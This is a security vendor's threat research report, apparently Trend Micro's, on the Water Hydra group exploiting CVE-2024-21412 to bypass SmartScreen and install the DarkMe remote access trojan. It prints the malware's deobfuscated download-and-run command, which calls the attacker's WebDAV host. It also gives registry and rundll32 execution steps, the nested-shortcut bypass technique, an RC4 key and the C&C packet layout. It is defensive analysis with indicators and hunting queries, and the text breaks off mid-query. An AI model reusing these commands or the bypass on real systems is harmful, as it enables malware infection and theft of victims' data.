{
    "id": "9af84443-59d9-47f9-bc6b-5bfe968e14e6",
    "created_at": "2024-02-17T02:05:57.006842Z",
    "updated_at": "2025-03-27T02:17:16.737249Z",
    "deleted_at": null,
    "sha1_hash": "edb8c33bf3b3cf5cf4ae6236d90fc3b6ea5210c1",
    "title": "",
    "authors": "",
    "file_creation_date": "2024-02-16T05:33:07Z",
    "file_modification_date": "2024-02-16T05:33:07Z",
    "file_size": 411672,
    "plain_text": "# CVE-2024-21412: Water Hydra Targets Traders With Microsoft Defender SmartScreen Zero-Day\n\n**[trendmicro.com/en_us/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-s.html](https://www.trendmicro.com/en_us/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-s.html)**\n\nFebruary 13, 2024\n\nExploits & Vulnerabilities\n\nThe APT group Water Hydra has been exploiting the Microsoft Defender SmartScreen vulnerability\n(CVE-2024-21412) in its campaigns targeting financial market traders. This vulnerability, which has now\nbeen patched by Microsoft, was discovered and disclosed by the Trend Micro Zero Day Initiative.\n\nBy: Peter Girnus, Aliakbar Zahravi, Simon Zuckerbraun February 13, 2024 Read time: 15 min (4059\nwords)\n\n[The Trend Micro Zero Day Initiative discovered the vulnerability CVE-2024-21412 which we track as](https://www.zerodayinitiative.com/)\nZDI-CAN-23100, and alerted Microsoft of a Microsoft Defender SmartScreen bypass used as part of a\nsophisticated zero-day attack chain by the advanced persistent threat (APT) group we track as Water\nHydra (aka DarkCasino) that targeted financial market traders.\n\nIn late December 2023, we began tracking a campaign by the Water Hydra group that contained similar\ntools, tactics, and procedures (TTPs) that involved abusing internet shortcuts (.URL) and Web-based\nDistributed Authoring and Versioning (WebDAV) components. In this attack chain, the threat actor\nleveraged CVE-2024-21412 to bypass Microsoft Defender SmartScreen and infect victims with the\nDarkMe malware. In cooperation with Microsoft, the ZDI bug bounty program worked to disclose this\n[zero-day attack and ensure a rapid patch for this vulnerability. Trend also provides protection to users](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21412)\nfrom threat actors that exploit CVE-2024-21412 via the security solutions that can be found at end of\nthis blog entry.\n\n## About the Water Hydra APT group\n\nThe Water Hydra group was first detected in 2021, when it gained notoriety for targeting the financial\nindustry, launching attacks against banks, cryptocurrency platforms, forex and stock trading platforms,\ngambling sites, and casinos worldwide.\n\nInitially, the group’s attacks were attributed to the Evilnum APT group due to similar phishing techniques\n[and other TTPs. In September 2022, researchers at NSFOCUS found the VisualBasic remote access](https://nsfocusglobal.com/operation-darkcasino-in-depth-analysis-of-attacks-by-apt-group-evilnum-part-1/)\ntool (RAT) called DarkMe as part of a campaign named DarkCasino, which targeted European traders\nand gambling platforms.\n\nBy November 2023, after several successive campaigns, including one that used the well-known\n[WinRAR code execution vulnerability CVE-2023-38831 in the attack chain to target stock traders, it](https://securityaffairs.com/154414/apt/darkcasino-apt-exploiting-winrar-0day.html)\nbecame evident that Water Hydra was its own APT group distinct from Evilnum.\n\nWater Hydra’s attack patterns show significant levels of technical skill and sophistication, including the\nability to use undisclosed zero-day vulnerabilities in attack chains. For example, the Water Hydra group\nexploited the aforementioned CVE-2023-38831 as a zero-day to target cryptocurrency traders in April\n2023 — months before disclosure. Since its disclosure, CVE-2023-38831 has also been exploited by\nother APT groups such as APT28 (FROZENLAKE), APT29 (Cozy Bear), APT40, Dark Pink, Ghostwriter,\nKonni, and Sandworm.\n\n\n-----\n\nWater Hydra attack chain and TTPs\n\n## December 2023 attack chain\n\nFigure 1 shows the original infection chain exploiting CVE-2024-21412. Since late January 2024, Water\nHydra has been using a streamlined infection process.\n\nFigure 1. The attack chain used by Water Hydra\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-chain-1.jpg)\n\n## Updated January-February 2024 attack chain\n\nIn January 2024, Water Hydra updated its infection chain exploiting CVE-2024-21412 to execute a\nmalicious Microsoft Installer File (.MSI), streamlining the DarkMe infection process.\n\nFigure 2. The updated attack chain\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-chain-2.jpg)\n\n## Infection chain analysis\n\nIn this section, we will analyze the full Water Hydra campaign exploiting CVE-2024-21412 to bypass\nMicrosoft Defender SmartScreen to infect users with DarkMe malware.\n\n**Initial Access: spearphishing attempts on forex forums**\n\n[In the attack chain, Water Hydra deployed a spearphishing campaign (T1566.002) on forex trading](https://attack.mitre.org/techniques/T1566/002/)\nforums and stock trading Telegram channels to lure potential traders into infecting themselves with\nDarkMe malware using various social engineering techniques, such as posting messages asking for or\nproviding trading advice, sharing fake stock and financial tools revolving around graph technical\nanalysis, graph indicator tools, all of which were accompanied by a URL pointing to a trojan horse stock\nchart served from a compromised Russian trading and cryptocurrency information site (fxbulls[.]ru).\n\nFigure 3. Threat Actor’s spearphishing posts on a popular forex trading forum\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-3.jpg)\n\nIt’s interesting to note that this compromised WordPress site shares the same name as an actual forex\nbroker, fxbulls[.]com, but is hosted on a Russian (.ru) domain.\n\nFigure 4. Comparison of fxbulls.ru (left) and fxbulls.com (right)\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-4.jpg)\n\nThe fxbulls[.]com broker uses the MetaTrader 4 (MT4) trading platform, which was removed from the\nApple App Store in September 2022 due to Western sanctions against Russia. However, Apple\nreinstated both MT4 and another MetaTrader version (MT5) by March 2023.\n\nDuring our analysis of the spearphishing campaign on the forex trading forums, we uncovered a\nconsiderable number of posts by Water Hydra in both the English and Russian languages. Often, these\nposts would reply to general forex or stock trading questions regarding the technical analysis of trading\ncharts and included a link to a stock chart as a lure.\n\n\n-----\n\nHowever, instead of the expected stock chart, these posts linked back to an HTM/HTML landing page\nhosted on a compromised Russian language forex, stock, and cryptocurrency news site hosted on\nWordPress with a landing page showing a second malicious link. This lure, disguised as a link to a\nJPEG file, points to a WebDAV share. Many of the accounts we uncovered posting links to the\nmalicious fxbulls[.]ru site were years old, indicating that DarkMe may have compromised legitimate user\naccounts on trading forums as part of its campaign.\n\nFigure 5. The malicious landing page on fxbulls[.]ru\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-5.jpg)\n\nThe landing page on fxbulls[.]ru contains a link to a malicious WebDAV share with a filtered crafted\nview. When users click on this link, the browser will ask them to open the link in Windows Explorer. This\nis not a security prompt, so the user might not think that this link is malicious.\n\nFigure 6. Analyzing the malicious link and WebDAV URL\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-6.jpg)\n\nFigure 6 shows the JPEG trojan horse linking back to a WebDAV share using Windows Advanced\nQuery Syntax (AQS).\n\n## Initial Access: using the search: protocol to customize the Windows Explorer window\n\nIn this campaign, Water Hydra employs an interesting technique to lure victims into clicking a malicious\n[Internet Shortcut (.url) file. This TTP abuses the Microsoft Windows search: Application Protocol, which](https://learn.microsoft.com/en-us/windows/win32/shell/search-protocol)\nis distinct from the more common ms-search protocol. The search: protocol, which has been a part of\nWindows since Vista, invokes the Windows desktop search application. During the infection chain,\n[Water Hydra uses the search: protocol with crafted Advanced Query Syntax (AQS) queries to](https://learn.microsoft.com/en-us/windows/win32/lwef/-search-2x-wds-aqsreference)\ncustomize the appearance of the Windows Explorer view in order to trick victims.\n\nFigure 7. HTML abusing the search: protocol\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-7.jpg)\n\nFigure 7 shows the HTML containing the malicious search: URL. Note the following characteristics of\nthe URL:\n\n[It uses the search: application protocol search](https://learn.microsoft.com/en-us/windows/win32/search/windows-search) to perform a search for photo_2023-12-29.jpg.\n[It uses the crumb](https://learn.microsoft.com/en-us/windows/win32/search/-search-3x-wds-qryidx-crumb) parameter to constrain the scope of the search to the malicious WebDAV\nshare.\n[It uses the DisplayName element to deceive users into thinking that this is the local](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/hh974615(v=vs.85))\nDownloads folder.\n\nFigure 8. The Malicious WebDAV Share with the view filtered\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-8.jpg)\n\nAfter clicking the link shown in Figure 7, we can see how the Windows Explorer view is presented to the\nvictim (Figure 8). By using a combination of search protocols, AQS queries, and the DisplayName\nelement, the Water Hydra operators can trick users into believing that the file from the malicious\nWebDAV server has been downloaded, tricking them into clicking this malicious file (a fake JPEG\n\n\n-----\n\n[image). This Explorer window is a carefully crafted view of a malicious .url file named photo_2023-12-](https://learn.microsoft.com/en-us/windows/win32/lwef/internet-shortcuts)\n_29.jpg.url. Microsoft Windows automatically hides the .url extension, making it appear from the filename_\nthat the file is a JPEG image.\n\n## Execution: exploiting CVE-2024-21412 (ZDI-CAN-23100) to bypass Microsoft Defender SmartScreen\n\nCVE-2024-21412 revolves around internet shortcuts. These .url files are simple INI configuration files\n[that take a “URL=” parameter pointing to a URL. While the .url file format is not officially documented,](https://nsis.sourceforge.io/CreateInternetShortcut_macro_&_function#The_.URL_file_format)\nthe URL parameter is the only one required for this file type.\n\nDuring our analysis of this malicious .url file, we also noticed that Water Hydra used the imagress.dll\n(Windows Image Resource) icon library to change the default internet shortcut file to the image icon\nusing the IconFile= and IconIndex= parameters to further deceive users and add legitimacy to the trojan\nhorse internet shortcut. Through a simple double-click of this internet shortcut disguised as a JPEG, the\nWater Hydra operators can bypass Microsoft Defender SmartScreen by exploiting CVE-2024-21412\nand fully compromise the Windows host.\n\nWhile analyzing the CVE-2024-21412-infected internet shortcut file, we noticed something unusual. The\n_URL= parameter of the photo_2023-12-29.jpg.url file pointed to another internet shortcut file hosted on_\na server with a dotted quad address (IPv4).\n\nFigure 9. The photo_2023-12-29.jpg.url internet shortcut points to another internet shortcut file\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-9.jpg)\n\nDuring our analysis of the malicious WebDAV share, we were able to obtain all the Water Hydra\nartifacts, including the referenced 2.url internet shortcut. Following this reference trail, we discovered\nthat the 2.url contained the logic to exploit the previously patched Microsoft Defender SmartScreen\n[bypass identified as CVE-2023-36025. During our recent research, we delved into a campaign targeting](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36025)\nthis CVE.\n\nFigure 10. The 2.url internet shortcut points to a CMD shell script within a ZIP archive\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-10.jpg)\n\nIt’s highly unusual to reference an internet shortcut within another internet shortcut. Because of this\nanomalous behavior, we created a proof-of-concept (PoC) to perform further testing and analysis.\nDuring this PoC testing, ZDI discovered that the initial shortcut (which referenced the second shortcut)\nmanaged to bypass the patch that addressed CVE-2023-36025, evading SmartScreen protections.\nThrough the analysis and testing of an internal PoC, we concluded that calling a shortcut within another\nshortcut was sufficient to evade SmartScreen, which failed to properly apply Mark-of-the-Web (MotW),\na critical Windows component that alerts users when opening or running files from an untrusted source.\nAfter our analysis, we contacted Microsoft MSRC to alert them about an active SmartScreen zero-day\nbeing exploited in the wild and provided them with our proof-of-concept exploit.\n\nFigure 11. A Microsoft Defender SmartScreen Window as it should appear after applying MotW\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-11.jpg)\n\nBy crafting the Windows Explorer view, Water Hydra is able to entice victims into clicking on an exploit\nfor CVE-2024-21412, which in turn executes code from an untrusted source, relying on Windows being\nunable to apply MotW correctly and resulting in a lack of SmartScreen protections The infection chain\n\n\n-----\n\nsimply runs in the background and the infected user has no knowledge of this.\n\nFigure 12. The a2.cmd file copies and runs a DarkMe loader called b3.dll\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-12.jpg)\n\nAfter bypassing SmartScreen, the second 2.url shortcut runs a batch file embedded in a ZIP file from\nthe attacker's WebDAV share. This batch script copies and executes a DarkMe dynamic-link library\n(DLL) loader from the malicious WebDAV share. It’s alarming that this entire sequence runs without the\nuser's knowledge and SmartScreen protections. The end user is given little to no indication that\nanything is afoot.\n\nFigure 13. Process Explorer showing batch file a2.cmd being copied and run\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-13.jpg)\n\nIn Figure 13, Sysinternals Process Explorer displays the malicious batch file's execution. This batch file\nis the first script to be ran after the exploitation of CVE-2024-21412 results in the bypassing of\nSmartScreen protections.\n\nFigure 14. Network connections made to the attacker command-and-control (C&C) server postexploitation for tools and persistence\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-14.jpg)\n\nThe screenshot in Figure 14 shows the numerous requests made to the Water Hydra WebDAV share.\nIn WebDAV we can observe several Property Find (PROPFIND) requests to retrieve XML-stored\nproperties from the WebDAV server.\n\nFigure 15. Image (JPEG) of a stock graph shown to the victim upon completion of the exploitation and\ninfection chains\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-15.jpg)\n\nOnce the exploitation and infection chains are complete, the threat actor connects to its C&C WebDAV\nserver to download a real JPEG file, which has the same name as the Trojan horse JPEG that was\nused to exploit CVE-2024-21412. This file is then displayed to the victim, who is deceived into thinking\nthat they have opened the JPEG file they originally intended to view from their Downloads folder\n(without any knowledge about the DarkMe infection).\n\n## Analysis of the DarkMe downloader\n\n**File name** b3.dll\n\n**MD5** 409e7028f820e6854e7197cbb2c45d06\n\n**SHA-1** d41c5a3c7a96e7a542a71b8cc537b4a5b7b0cae7\n\n**SHA-256** bf9c3218f5929dfeccbbdc0ef421282921d6cbc06f270209b9868fc73a080b8c\n\n**Compiler** Win32 Executable Microsoft Visual Basic 6 [Native]\n\n\n-----\n\n**Original**\n**name**\n\n\nundersets.dll\n\n\n**File type** Win32 DLL\n\n**TLSH** T18F856B9611E3EFACCAA049B8599FA01184A2CD3580355D73A191CE1BFB3AE13F4177B7\n\n\n**Compilation**\n**date**\n\n\n2024-01-04\n\n\nTable 1. Properties of the DarkMe downloader (b3.dll)\n\nThe DarkMe downloader is a DLL, written in Visual Basic, that is responsible for downloading and\nexecuting the next stage payload from the attacker's WebDAV. The malware carries out its actions by\nrunning a series of commands through the cmd.exe command interpreter. Within the malware, these\ncommands are scrambled using a reverse string technique. To execute the commands, it first\nreconstructs them by employing the Strings.StrReverse method to reverse the string order back to\nnormal, after which it executes them via the shell method. It’s important to note that the malware is\nloaded with junk code to disguise its true purpose and to complicate reverse engineering. For the sake\nof research and easier understanding, all the code snippets in this blog entry are presented in a\ndeobfuscated, cleaner form.\n\nThe following snippet illustrates how the malware performs the above operations:\n\nFigure 16. The obfuscated commands used by the DarkMe downloader\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-16.jpg)\n\nThe deobfuscated command line is as follows:\n\ncmd /c copy /b \\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures\\7z[.]dll %TEMP%\\7z[.]dll&&cmd /c copy /b\n\\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures\\7z[.]exe %TEMP%\\7z[.]exe&&cmd /c\n\\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures\\photo_2023-12-29s[.]jpg&&cmd /c copy /b\n\\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures\\My2[.]zip %TEMP%\\My2[.]zip&&timeout 1&&cmd /c cd\n%TEMP%&&7z x \"My2[.]zip\" -password-1 -y&&timeout 1&&cmd /c rundll32 undersets[.]dll,\nRunDllEntryPointW&&timeout 1&&pause\n\nThe following table shows the executed commands and an explanation of what they do:\n\n|Command|Details|\n|---|---|\n|cmd /c copy /b \\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures\\7z[.]dll %TEMP%\\7z[.]dll&&cmd /c copy /b \\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures\\7z[.]exe|Copies 7z.dll and 7Z.exe from a WebDAV share located at \\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures to the local temporary folder %TEMP% of an infected system|\n|cmd /c \\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures\\photo_2023- 12-29s[.]jpg|Opens and displays a decoy stock graph photo_22023-12-29s.jpg|\n\n\n-----\n\n|cmd /c copy /b \\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures\\My2[.]zip %TEMP%\\My2[.]zip|Copies My2.zip from a WebDAV share located at \\\\84[.]32[.]189[.]74@80\\fxbulls\\pictures to the local temporary folder %TEMP% of an infected system|\n|---|---|\n|timeout 1|Pauses the script for 1 second|\n|cmd /c cd %TEMP%|Changes the current directory to the local temporary folder|\n|7z x \"My2[.]zip\" -password-1 -y|Uses the 7z (7-Zip) command-line tool to extract My22[.]zip using the password “assword-1” — the -y flag automatically answers “yes” to all prompts, such as prompts to overwrite files|\n|timeout 1|Pauses the script for another second|\n|cmd /c rundll32 undersets[.]dll, RunDllEntryPointW|Executes a DLL file (undersets[.]dll) using rundll32, a legitimate Windows command. RunDllEntryPointW is likely the entry point for the DLL. This is a common technique during malware infections designed to execute code within the context of a legitimate process.|\n|timeout 1|Pauses the script for yet another second|\n|Pause|Waits for the user to press a key before continuing or terminating the process; it is often used for debugging or to keep a command window open|\n\n\nTable 2. The commands executed by the script\n\nAs shown in the final steps of the script, the malware executes the RunDllEntryPointW export function\nfrom a DLL named undersets.dll via rundll32.\n\nThe following image shows the contents of My2.zip:\n\nFigure 17. The contents of My2.zip\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-17.jpg)\n\nAnalysis of the DarkMe Loader\n\n**File Name** undersets.dll\n\n**MD5** 409e7028f820e6854e7197cbb2c45d06\n\n**SHA-1** d41c5a3c7a96e7a542a71b8cc537b4a5b7b0cae7\n\n\n-----\n\n**SHA-256** bf9c3218f5929dfeccbbdc0ef421282921d6cbc06f270209b9868fc73a080b8c\n\n**Compiler** Win32 Executable Microsoft Visual Basic 6 [Native]\n\n\n**Original**\n**name**\n\n\nundersets.dll\n\n\n**File type** Win32 DLL\n\n**TLSH** T18F856B9611E3EFACCAA049B8599FA01184A2CD3580355D73A191CE1BFB3AE13F4177B7\n\n\n**Compilation**\n**date**\n\n\n2024-01-04\n\n\nTable 3. Properties of the DarkMe loader (undersets.dll)\n\nUpon execution, the malware builds a DarkMe payload by merging the contents of two binary files — a1\nand a2 — into a single new file, C:\\Users\\admin\\AppData\\Roaming\\OnlineProjects\\OnlineProject.dll.\n\nTo avoid exposing important strings directly within the binary, the malware encodes them in\nhexadecimal format. It subsequently decodes these into their ASCII representations during execution as\nnecessary.\n\nTo simplify research and enhance readability, all the junk code has been removed and hex-encoded\ndata converted to ASCII format.\n\nThe malware constructs and executes the following command that leverages the reg.exe utility to\nimport registry settings from the kb.txt file:\n\n\"C:\\Windows\\System32\\cmd.exe\" /c cd C:\\Users\\admin\\AppData\\Roaming\\OnlineProjects&&cmd\n/c timeout 1&&cmd /c reg.exe import kb.txt\n\nThese settings are related to registering DarkMe payload OnlineProject.dll as a COM server and setting\nup its configuration in the system's registry.\n\nFigure 18. Constructing and executing commands to import a registry file\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-18.jpg)\n\nThe following snippet shows the kb.txt registry file content:\n\nFigure 19. Constructing and executing commands to import a registry file\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-19.jpg)\n\nFinally, to run the payload, the loader executes the following command to invoke the registered COM\nclass:\n\n\"C:\\Windows\\SysWOW64\\rundll32.exe\" /sta {74A94F46-4FC5-4426-857B-FCE9D9286279}\n\nFigure 20. The payload execution via COM class\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-20.jpg)\n\nAnalysis of the DarkMe RAT\n\n\n-----\n\n|FIle Name|OnlineProject.dll|\n|---|---|\n|MD5|93daa51c8af300f9948fe5fd51be3bfb|\n|SHA-1|a2ba225442d7d25b597cb882bb400a3f9722a5d4|\n|SHA-256|d123d92346868aab77ac0fe4f7a1293ebb48cf5af1b01f85ffe7497af5b30738|\n|Compiler|Win32 Executable Microsoft Visual Basic 6 [Native]|\n|Original name|buogaw1.ocx|\n|File type|Win32 DLL|\n|TLSH|T1bb37ee6ef390e371a4468862785893d570ecb2bf4049a825fb12cb197bd5cfbe1a1713|\n|Compilation date|2024-01-04|\n\n\nTable 4. Properties of the DarkMe RAT (OnlineProject.dll)\n\nThe final delivery of this attack is a RAT known as DarkMe. Like the loader and downloader modules,\nthis malware is a DLL file and written in Visual Basic. However, this final module has a higher amount of\nobfuscation and junk code compared to the previous two. The malware communicates with its C&C\nserver using a custom protocol over TCP.\n\nUpon execution, the malware gathers information from the infected system, including the computer\nname, username, installed antivirus software, and the title of the active window. It then registers itself\nwith the attacker's C&C server.\n\nTo establish network communication and handle socket messages, the malware creates a hidden\nwindow named SOCKET_WINDOW with STATIC type using the CreateWindowEx Windows API. This\nhidden window facilitates communication with the server by channeling socket data through window\nmessages.\n\nFigure 21. Establishing network communication via CreateWindowEx\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-21.jpg)\n\nThe C&C domain is encrypted using RC4 and stored in a VB.Form TextBox named Text2022. The\nmalware decrypts it using a hardcoded key, \"noway123!$$#@35@!\".\n\nFigure 22. The domain RC4 decryption process\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-22.jpg)\n\nThe malware then registers the victim’s system with its C&C server by gathering information such as\nthe computer name, username, installed antivirus software, and the title of the active window.\n\nThe following is an example of the initial network traffic the malware sends to register victims:\n\n\n-----\n\nFigure 23. The DarkMe RAT’s initial traffic\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-23.jpg)\n\nThe following is the initial packet structure used by DarkMe:\n\n**Packet** **Details**\n\n92 Hardcoded magic value for data exfiltration\n\n0xA9 xA9 0xA9 Delimiter\n\nUS Abbreviated country name retrieved via GetLocaleInfo API with LCType\n\nUnited States Name of country retrieved via GetLocaleInfo API with LCType\nLOCALE_SENGLISHCOUNTRYNAME\n\n0xA9 Delimiter\n\nDESKTOP- Computer Name/Username\nBFTPUHP/admin\n\n0xA9 Delimiter\n\n(Microsoft Defender) Retrieved list of installed antivirus software by utilizing the Windows\nManagement Instrumentation (WMI) service. If there are no antivirus\nproducts installed, the malware will use a default value (“No Antivirus”).\n\n0xA9 Delimiter\n\n123 Fixed hardcoded value (Retrieved from the VB.TextBox Text10aa Text value)\n\n0xA9 Delimiter\n\nMicrosoft Office Foreground Window Title: If no window is open, the malware selects the\nClick-to-Run (SxS) hidden window title value Microsoft Office Click-to-Run (SxS) from the\n\n_Darkme VB.Form_\n\n0xA9 Delimiter\n\nTable 5. Initial packet structure used by DarkMe\n\nFigure 24. The DarkMe RAT C&C registration packet construction\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-24.jpg)\n\nTo check the connection with the C&C server, the malware periodically sends a heartbeat packet. The\nmalware sets up a separate timer called Timer3 with an interval of “5555 milliseconds” for this task.\nFigure 25 shows an example of this traffic (some variants of DarkMe send a different value):\n\nFigure 25. DarkMe heartbeat traffic\n[download](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/water-hydra-25.jpg)\n\n|Packet|Details|\n|---|---|\n|92|Hardcoded magic value for data exfiltration|\n|0xA9 xA9 0xA9|Delimiter|\n|US|Abbreviated country name retrieved via GetLocaleInfo API with LCType|\n|United States|Name of country retrieved via GetLocaleInfo API with LCType LOCALE_SENGLISHCOUNTRYNAME|\n|0xA9|Delimiter|\n|DESKTOP- BFTPUHP/admin|Computer Name/Username|\n|0xA9|Delimiter|\n|(Microsoft Defender)|Retrieved list of installed antivirus software by utilizing the Windows Management Instrumentation (WMI) service. If there are no antivirus products installed, the malware will use a default value (“No Antivirus”).|\n|0xA9|Delimiter|\n|123|Fixed hardcoded value (Retrieved from the VB.TextBox Text10aa Text value)|\n|0xA9|Delimiter|\n|Microsoft Office Click-to-Run (SxS)|Foreground Window Title: If no window is open, the malware selects the hidden window title value Microsoft Office Click-to-Run (SxS) from the Darkme VB.Form|\n|0xA9|Delimiter|\n\n\n-----\n\nOnce the malware registers its victim, it then initiates a listener for incoming TCP connections, waiting\nto receive commands from the attacker. Once a command is received, the malware parses and\nexecutes it on the infected system. The malware supports a wide range of functionalities. The\nsupported commands would allow malware to Enumerate directory content (STRFLS, STRFL2),\nexecute shell commands (SHLEXE), create and delete directories, retrieve system drive information\n(300100), and generate a ZIP file from given path (ZIPALO), among others.\n\n## Conclusion\n\nZero-day attacks represent a significant security risk to organizations, as these attacks exploit\nvulnerabilities that are unknown to software vendors and have no corresponding security patches. APT\ngroups such as Water Hydra possess the technical knowledge and tools to discover and exploit zeroday vulnerabilities in advanced campaigns, deploying highly destructive malware such as DarkMe.\n\nIn a previous campaign, Water Hydra exploited CVE-2023-38831 months before organizations could\ndefend themselves. After disclosure, CVE-2023-38831 was subsequently deployed in other campaigns\nby other APT groups. ZDI has noticed several alarming trends in zero-day abuse. First, there exists a\ntrend where zero-days found by cybercrime groups make their way into attack chains deployed by\nnation-state APT groups such as APT28 (FROZENLAKE), APT29 (Cozy Bear), APT40, Dark Pink,\nGhostwriter, Konni, Sandworm and more. These groups employ these exploits to launch sophisticated\nattacks, thereby exacerbating risks to organizations. Second, the simple bypass of CVE-2023-36025 by\nCVE-2024-21412 highlights a broader industry trend when it comes to security patches that show how\nAPT threat actors can easily circumvent narrow patches by identifying new vectors of attack around a\npatched software component.\n\n[To make software more secure and protect customers from zero-day attacks, the Trend Zero Day](https://www.zerodayinitiative.com/)\n[Initiative works with security researchers and vendors to patch and responsibly disclose software](https://www.zerodayinitiative.com/)\nvulnerabilities before APT groups can deploy them in attacks. The ZDI Threat Hunting team also\nproactively hunts for zero-day attacks in the wild to safeguard the industry.\n\n[Organizations can protect themselves from these kinds of attacks with Trend Vision One™️, which](https://www.trendmicro.com/en_us/business/products/security-operations.html)\nenables security teams to continuously identify attack surfaces, including known, unknown, managed,\nand unmanaged cyber assets. Vision One helps organizations prioritize and address potential risks,\nincluding vulnerabilities. It considers critical factors such as the likelihood and impact of potential\nattacks and offers a range of prevention, detection, and response capabilities. This is all backed by\nadvanced threat research, intelligence, and AI, which helps reduce the time taken to detect, respond,\nand remediate issues. Ultimately, Vision One can help improve the overall security posture and\neffectiveness of an organization, including against zero-day attacks.\n\nWhen faced with uncertain intrusions, behaviors, and routines, organizations should assume that their\nsystem is already compromised or breached and work to immediately isolate affected data or\ntoolchains. With a broader perspective and rapid response, organizations can address breaches and\n[protect its remaining systems, especially with technologies such as Trend Micro Endpoint Security and](https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html)\n[Trend Micro Network Security, as well as comprehensive security solutions such as Trend](https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html)\n[Micro™ XDR, which can detect, scan, and block malicious content across the modern threat landscape.](https://www.trendmicro.com/en_us/business/products/detection-response/xdr.html)\n\n## Epilogue\n\nDuring our investigation into CVE-2024-21412 and Water Hydra we began tracking additional threat\nactor activity around this zero-day. In particular, the DarkGate malware operators began incorporating\nthis exploit into their infection chains. We will be providing additional information and analysis on threat\n\n\n-----\n\nactors that have exploited CVE-2024-21412 in a future blog entry. Trend Micro customers are protected\nfrom these additional campaigns via virtual patches for ZDI-CAN-23100.\n\n## Trend Protections\n\nThe following protections exist to detect and protect Trend customers against the zero-day CVE-202421412 (ZDI-CAN-23100) and the DarkMe Malware Payload.\n\n**Trend Vision One Model**\n\nPotential Exploitation of Microsoft SmartScreen Detected (ZDI-CAN-23100)\nExploitation of Microsoft SmartScreen Detected (CVE-2024-21412)\nSuspicious Activities Over WebDav\n\n**Trend Vision One Threat Hunting Queries**\n\n(productCode:sds OR productCode:pds OR productCode:xes OR productCode:sao) AND eventId:1\nAND eventSubId:2 AND objectCmd:\"rundll32.exe\" AND objectCmd:/fxbulls/ AND ( objectCmd:.url 